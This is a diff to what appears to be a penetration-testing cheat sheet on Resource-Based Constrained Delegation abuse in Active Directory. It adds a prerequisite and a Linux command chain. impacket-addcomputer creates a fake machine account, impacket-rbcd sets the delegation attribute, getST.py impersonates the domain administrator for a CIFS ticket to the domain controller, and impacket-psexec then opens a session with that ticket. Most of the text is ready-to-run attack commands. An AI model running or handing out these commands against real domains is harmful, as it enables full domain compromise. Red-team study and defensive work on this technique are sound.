@@ -12,6 +12,8 @@ With RBCD, this is the resource machine (the machine that receives delegation) w
 
 2) Domain users can create some machine, ms-ds-machineaccountquota MUST NOT be 0!
 
+3) GenericAll or GenericWrite on Domain Controller
+
 ##### To verify
 
     Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local
@@ -58,7 +60,7 @@ The attacker has compromised ServiceA and wants to compromise ServiceB. He also 
 
 ### 1) Add a fake machine account in the domain
 
-### 2) Add it the to msds-allowedtoactonbehalfofotheridentity attribute of the target machine
+### 2) Add it to the msds-allowedtoactonbehalfofotheridentity attribute of the target machine
 
     Import-Module Powermad.ps1
     Import-Module PowerView.ps1
@@ -96,10 +98,24 @@ The attacker has compromised ServiceA and wants to compromise ServiceB. He also 
 
 ## Linux
 
-    addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -domain-netbios domain.local 'domain.local/user1:password'
-    rbcd.py -action write -delegate-from ControlledComputer$ -delegate-to ServiceB$ domain.local/ControlledComputer$:ComputerPassword
-    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -dc-ip <DC_IP> domain.local/ControlledComputer$:ComputerPassword
+Create a new Machine Account
+
+    impacket-addcomputer -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-ip DC_IP 'domain.local/user1:password'
+
+Set the msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account
+    
+    impacket-rbcd -action write -delegate-from ControlledComputer$ -delegate-to TARGET_MACHINE$ domain.local/ControlledComputer$:ComputerPassword
+
+Get the Administrator service ticket
+
+
+    getST.py -spn 'cifs/dc01.domain.local' -impersonate administrator -dc-ip <DC_IP> domain.local/ControlledComputer$:ComputerPassword
+
     export KRB5CCNAME=./Administrator.ccache
+
+Authenticate with psexec
+
+    impacket-psexec -k -no-pass dc01.domain.local -dc-ip DC_IP
 
 ### 3) Use the S4USelf function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not protected)
 
